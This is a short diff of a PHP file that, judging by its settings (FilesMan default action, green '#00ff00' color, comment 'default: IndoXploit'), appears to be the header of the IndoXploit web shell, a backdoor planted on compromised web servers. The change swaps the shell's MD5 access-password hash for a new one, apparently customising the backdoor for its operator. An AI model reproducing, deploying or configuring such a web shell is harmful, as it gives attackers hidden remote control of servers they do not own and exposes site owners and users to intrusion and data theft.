@@ -10,7 +10,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$auth_pass = "7b4939a8af28c814f0c757bb10f40d3d"; // default: IndoXploit
+$auth_pass = "04ed00b5109398453ad38b456409fdbf"; // default: IndoXploit
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
